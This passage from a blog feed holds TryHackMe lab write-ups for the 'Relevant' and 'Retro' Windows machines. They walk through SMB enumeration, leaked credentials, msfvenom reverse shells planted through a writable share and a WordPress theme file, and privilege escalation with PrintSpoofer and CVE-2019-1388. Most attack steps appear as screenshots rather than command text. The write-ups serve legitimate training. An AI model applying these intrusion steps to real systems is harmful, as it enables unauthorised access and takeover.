<p>First we will create a directory with the name of the machine, and with <strong><em>mkt</em></strong> i will create the following directories to be able to organize the files of each one of those directories.</p>

<p align="center">
<img src="/assets/images/img-relevant/mkt.png" />
</p>

<p>mkt is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt () {
        mkdir {nmap,content,exploits,scripts}
}
</code></pre></div></div>

<p>So if we send an icmp trace we can see that we have a connection form the target machine and through the TTL we know that is a windows machine, remember that the linux machine have 64 TTL and windows have 128 TTL and sometimes this values can decrease one digit and this because of traceroute.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura1.png" />
</p>

<h2 id="scanning">Scanning</h2>

<p>Let’s scan the target machine with nmap using the following parameters:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV (-sC -sV)</td>
      <td>Use nmap recon scripts to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>specify the ports that we want to scan (i know what’s ports to scan because i do previous scan to know whats ports are open).</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td>Save the scan in nmap format.</td>
    </tr>
  </tbody>
</table>

<p>This is the scan result, we can see that there is a webserver on the port 80 and 49663 and smb on the port 445. The default nmap scripts reports us which version of windows is using the target machine using smb.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Tue Jul 12 16:17:45 2022 as: nmap -sCV -p80,135,139,445,3389,49663,49667,49669 -oN targeted 10.10.225.44
</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">225.44</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">10.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">IIS</span> <span class="n">Windows</span> <span class="n">Server</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>  <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2016</span> <span class="n">Standard</span> <span class="n">Evaluation</span> <span class="mi">14393</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">12</span><span class="n">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">36</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">1</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">Relevant</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">11</span><span class="n">T20</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">45</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2023</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">10</span><span class="n">T20</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">45</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">RELEVANT</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">RELEVANT</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">RELEVANT</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">Relevant</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">Relevant</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0</span><span class="p">.</span><span class="mi">14393</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">12</span><span class="n">T20</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">55</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="mi">49663</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">10.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">IIS</span> <span class="n">Windows</span> <span class="n">Server</span>
<span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>         <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OSs</span><span class="p">:</span> <span class="n">Windows</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">1</span><span class="n">h24m01s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">3</span><span class="n">h07m50s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mf">3.1</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">account_used</span><span class="p">:</span> <span class="n">guest</span>
<span class="o">|</span>   <span class="n">authentication_level</span><span class="p">:</span> <span class="n">user</span>
<span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">12</span><span class="n">T20</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">59</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">12</span><span class="n">T20</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">16</span>
<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2016</span> <span class="n">Standard</span> <span class="n">Evaluation</span> <span class="mi">14393</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2016</span> <span class="n">Standard</span> <span class="n">Evaluation</span> <span class="mf">6.3</span><span class="p">)</span>
<span class="o">|</span>   <span class="n">Computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">Relevant</span>
<span class="o">|</span>   <span class="n">NetBIOS</span> <span class="n">computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">RELEVANT</span>\<span class="n">x00</span>
<span class="o">|</span>   <span class="n">Workgroup</span><span class="p">:</span> <span class="n">WORKGROUP</span>\<span class="n">x00</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">12</span><span class="n">T13</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">56</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="c1"># Nmap done at Tue Jul 12 16:19:37 2022 -- 1 IP address (1 host up) scanned in 112.09 seconds
</span></code></pre></div></div>

<h2 id="enumeration">Enumeration</h2>

<p>So if we access the website on the port 80 we can see that is the default page of IIS, so anything interestting here at the moment.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura2.png" />
</p>

<p>Using <strong><em>smbclient</em></strong> if we list smb shares using a null session with the flag <strong><em>-N</em></strong> we can see that there is a following share called <strong><em>nt4wrksv</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura3.png" />
</p>

<p>If we access on that share we can see that there is the following text file, so let’s download it on our attacker machine using the command <strong><em>get</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura4.png" />
</p>

<p>And we can see that there is a passwords encoded in base64.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura5.png" />
</p>

<p>So if we decode it we can see that there is a two users with the following passwords.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura6.png" />
</p>

<p>Using <strong><em>psexec</em></strong> we can see that we can not access with the target machine using these credentials.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura7.png" />
</p>

<p>If try to validate those credentials using <strong><em>crackmapexec</em></strong> it will not output anything, so that’s mean that the user doesn’t exits or the password is incorrect.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura8.png" />
</p>

<p>So if we try to fuzz on the port 49663 webserver we can find a subdirectory that is named the same as the SMB share as we saw before, which is <strong><em>nt4wrksv</em></strong>. In this case the fuzzing process to find directories on the webserver it can long time, so thats why i don’t use it fuzzing tools only i check manually if that path exists or not.</p>

<p>We can check to see if that share is linked to the webserver by trying to access the <strong><em>passwords.txt</em></strong> file that we saw before and we can see that we can view the content of that file, thats mean that this share is linked to the webserver on the port 49663.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura9.png" />
</p>

<h2 id="exploitation">Exploitation</h2>

<p>In this case we have read and write permissions to the web directory that is linked through the SMB share, we can test this by transfering a file on that share. Knowing that we can create a payload with <strong><em>msfvenom</em></strong> to get a reverse shell on the target machine, note that IIS generally requires an <strong><em>aspx</em></strong> shell and that’s mean that we need to specify this file type with the flag <strong><em>-f</em></strong>, the payload is need to be in x64 architecture because we saw previously the version of windows that is using the target machine.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura10.png" />
</p>

<p>Once generated the payload let’s transfer to the SMB share that is linked to the webserver using smbclient again.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura11.png" />
</p>

<p>Start a netcat listener on the port that we specify in msfvenom and access on that malicious payload that we generated on the webserver and we will see that it is loading the file.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura12.png" />
</p>

<p>Now if we go back on our netcat listener we can see that we have access to the machine.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura13.png" />
</p>

<p>We can see that there is a user called <strong><em>bob</em></strong> on the system as we saw before.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura14.png" />
</p>

<p>And if we try to access on the desktop folder of that user we can view the first flag which is <strong><em>user.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura15.png" />
</p>

<h2 id="privesc">PrivESC</h2>

<p>If we execute the command <strong><em>whoami /priv</em></strong> to check the privileges that we have with this current user we can that the <strong><em>SeImpersonatePrivilege</em></strong> is enabled (in the following <a href="https://bynafrez08.github.io/thm-alfred/#">article</a> i explain in detail how to exploit this privileges).</p>

<p align="center">
<img src="/assets/images/img-relevant/captura16.png" />
</p>

<p>In this case we are going to use the binary <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> to exploit this privilege, once we download the binary let’s transfer on the targer machine.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura17.png" />
</p>

<p>Now we are going to execute the binary with the flag <strong><em>-i</em></strong> to interact with the new process and <strong><em>-c</em></strong> to execute a command, in this case we are going to execute a command prompt (cmd). And as you can see it’s take advantage of the <strong><em>SeimpersonatePrivilege</em></strong> to access as admin users.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura18.png" />
</p>

<p>Now if we move on the admin user desktop directory we can view the last flag which is <strong><em>root.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-relevant/captura19.png" />
</p>

<h2 id="conclusion">Conclusion</h2>

<p>This is one of the machines that i recommend to do if you are starting doing ctf’s, because it’s a easy machine and it’s cover some basics exploitations on windows systems.</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Web" /><category term="Tryhackme" /><category term="Windows" /><category term="CVE" /><summary type="html"><![CDATA[Relevant is a windows machine that has enabled smb which will going to exploit this services to access on the machine, and for the privilege escalation we are going to exploit windows access tokens.]]></summary></entry><entry><title type="html">THM - Retro</title><link href="http://0.0.0.0:4000/thm-retro/" rel="alternate" type="text/html" title="THM - Retro" /><published>2022-08-08T00:00:00-04:00</published><updated>2022-08-08T00:00:00-04:00</updated><id>http://0.0.0.0:4000/thm-retro</id><content type="html" xml:base="http://0.0.0.0:4000/thm-retro/"><![CDATA[<p>Retro is a windows machine with wordpress site hosted on the port 80, which contain some credentials that allow access on the admin panel and get a reverse shell on the target machine, and lastly we escalete privileges abusing the CVE-2019-1388.</p>

<p align="center">
<img src="/assets/images/img-retro/retro.jpeg" />
</p>

<p>First we will create a directory with the name of the machine, and with <strong><em>mkt</em></strong> i will create the following directories to be able to organize the files of each one of those directories.</p>

<p align="center">
<img src="/assets/images/img-retro/mkt.png" />
</p>

<p>mkt is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt () {
        mkdir {nmap,content,exploits,scripts}
}
</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>This machine doesn’t response icmp packets so we move directly with the nmap scan with the following parameters:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV (-sC -sV)</td>
      <td>Use nmap recon scripts to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>No ping, this machine no response icmp packets so we must assign this flag.</td>
    </tr>
    <tr>
      <td>-p</td>
      <td>specify the ports that we want to scan (i know what’s ports to scan because i do previous scan to know whats ports are open).</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td>Save the scan in nmap format.</td>
    </tr>
  </tbody>
</table>

<p>As we can see here there is port 80 open with IIS and on the port 3389 is running rdp, so we can access later remotely on the target machine with rdp.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Wed Jul 27 19:08:06 2022 as: nmap -sCV -p80,3389 -Pn -oN targeted 10.10.68.169
</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">68.169</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.047</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>       <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>          <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">10.0</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">IIS</span> <span class="n">Windows</span> <span class="n">Server</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">RetroWeb</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">26</span><span class="n">T22</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">29</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2023</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">25</span><span class="n">T22</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">29</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">27</span><span class="n">T23</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">28</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">1</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">RETROWEB</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">RETROWEB</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">RETROWEB</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">RetroWeb</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">RetroWeb</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0</span><span class="p">.</span><span class="mi">14393</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">27</span><span class="n">T23</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">27</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="c1"># Nmap done at Wed Jul 27 19:08:27 2022 -- 1 IP address (1 host up) scanned in 21.14 seconds
</span></code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<p>So if we access on the webpage on the port 80 we can see that is a default page of IIS.</p>

<p align="center">
<img src="/assets/images/img-retro/captura2.png" />
</p>

<p>Using gobuster if we try to fuzz the webpage we can find that there is path called <strong><em>retro</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura3.png" />
</p>

<p>If we access it, we can see that is a wordpress site with some posts.</p>

<p align="center">
<img src="/assets/images/img-retro/captura4.png" />
</p>

<p>Now if we try to fuzz the retro path we can see that it’s contain dafault wordpress directories.</p>

<p align="center">
<img src="/assets/images/img-retro/captura5.png" />
</p>

<p>Now we can see that all the posts are write by the user <strong><em>Wade</em></strong> and if we look one of this posts there is comment by that user saying the word <strong><em>parzival</em></strong>, this can be some pontential credentials that wecan try to use.</p>

<p align="center">
<img src="/assets/images/img-retro/captura6.png" />
</p>

<p>Moving on the login page let’s try using this credentials to see if it’s works, which is <strong><em>wade:parzival</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura7.png" />
</p>

<p>And as you can see we have access on the admin page of this wordpress site.</p>

<p align="center">
<img src="/assets/images/img-retro/captura8.png" />
</p>

<p>Now let’s try to access on the target system, first let’s generate a payload with msfvenom to get reverse shell with php, remember that wordpress use php on the backend.</p>

<p align="center">
<img src="/assets/images/img-retro/captura9.png" />
</p>

<p>Once genereted the paylod let’s open it and we are going to remove the comments on the first line and the last, and save the payload.</p>

<p align="center">
<img src="/assets/images/img-retro/captura10.png" />
</p>

<p>In order to get reverse shell inside of the wordpress admin page is moving on the follwing path and paste the payload that we generated before, and then click on <strong><em>update file</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura11.png" />
</p>

<p>Now we are going to listening with netcat on the port that we specify on the payload and then we are going to access on the following route and it’s going to loading.</p>

<p align="center">
<img src="/assets/images/img-retro/captura12.png" />
</p>

<p>Now if we go back on our netcat listener we can see that we receive a connection to the target machine and we have access.</p>

<p align="center">
<img src="/assets/images/img-retro/captura13.png" />
</p>

<p>So if we list the directory users we can see that there is directory for the user <strong><em>wade</em></strong> but it not allow me to access on that directory and any directories on the system, so then i realised that there is rdp service enbled on this machine.</p>

<p align="center">
<img src="/assets/images/img-retro/captura15.png" />
</p>

<p>So i try to access with rpd using <strong><em>xfreerdp</em></strong> using the credentials that we saw before, and as you can see i have access on target system and view the first flag which is <strong><em>user.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura16.png" />
</p>

<h2 id="privesc">PrivESC</h2>

<p>Now open a command prompt and execute the command <strong><em>whoami /priv</em></strong> to see what privileges we can abused, and anythin interesting we can find here.</p>

<p align="center">
<img src="/assets/images/img-retro/captura17.png" />
</p>

<p>Then i realised that there is chrome installed, so if we open chrome we can see that there is a site highlighted with a particular CVE.</p>

<p align="center">
<img src="/assets/images/img-retro/captura18.png" />
</p>

<p>If we access on that website we can see that is a vulnerablity to escalate privileges abusing windows certificate dialog. So maybe this machine it’s vulnerable to this particular CVE and the user maybe not mitigated.</p>

<p align="center">
<img src="/assets/images/img-retro/captura19.png" />
</p>

<p>Now if we search for this CVE we can see that there is a <a href="https://github.com/jas502n/CVE-2019-1388">Poc</a> with an exploit.</p>

<p align="center">
<img src="/assets/images/img-retro/captura20.png" />
</p>

<p>So on that repo it’s show us how to exploit this vulnerability with the following executable, so first let’s download that .exe binary and setup a http server to transfer on the victim machine.</p>

<p align="center">
<img src="/assets/images/img-retro/captura21.png" />
</p>

<p>On the target machine we are going to use <strong><em>Invoke-Webrequest</em></strong> command to download that binary.</p>

<p align="center">
<img src="/assets/images/img-retro/captura22.png" />
</p>

<p>As it indicates on the README.md file on the repo we need to run this executable with admin privileges.</p>

<p align="center">
<img src="/assets/images/img-retro/captura23.png" />
</p>

<p>It’s going to popup to ask for a admin password, here we going to click on <strong><em>show more details</em></strong> and then click on <strong><em>show information about the publisher’s certificate</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura24.png" />
</p>

<p>Once we click on that it will appear a popup to chose the browser that we want to see the information, in this case we are going to chose <strong><em>internet explorer</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura25.png" />
</p>

<p>Once the internet explorer it’s open we need go on <strong><em>settings</em></strong> the <strong><em>file</em></strong> and click on <strong><em>save as</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-retro/captura26.png" />
</p>

<p>Now here if we execute <strong><em>cmd.exe</em></strong> on the following path we can see that we are as an <strong><em>nt authority\system</em></strong>, means that we are as an admins.</p>

<p align="center">
<img src="/assets/images/img-retro/captura27.png" />
</p>

<p>And with that we can access on the admin user folder and view the root flag.</p>

<p align="center">
<img src="/assets/images/img-retro/captura28.png" />
</p>

<h2 id="conclusions">Conclusions</h2>

<p>This is one of those machine that i recommend if you are starting doing ctf’s because it’s esay and it’s show you the methodology that you need follow in order to compromise a system.</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Web" /><category term="Tryhackme" /><category term="Windows" /><category term="CVE" /><category term="Wordpress" /><summary type="html"><![CDATA[Retro is a windows machine with wordpress site hosted on the port 80, which contain some credentials that allow access on the admin panel and get a reverse shell on the target machine, and lastly we escalete privileges abusing the CVE-2019-1388.]]></summary></entry><entry><title type="html">THM - Alfred</title><link href="http://0.0.0.0:4000/thm-alfred/" rel="alternate" type="text/html" title="THM - Alfred" /><published>2022-08-05T00:00:00-04:00</published><updated>2022-08-05T00:00:00-04:00</updated><id>http://0.0.0.0:4000/thm-alfred</id><content type="html" xml:base="http://0.0.0.0:4000/thm-alfred/"><![CDATA[<p>Alfred is a windows machine which has jenkins installed on the port 8080 and the first step is to exploit it and gain access to the machine, and in privilege escalation we are going to be exploiting the windows authentication tokens we are going exploit this in two ways, the first on metasploit and then manually.</p>

<p align="center">
<img src="/assets/images/img-alfred/portada.png" />
</p>

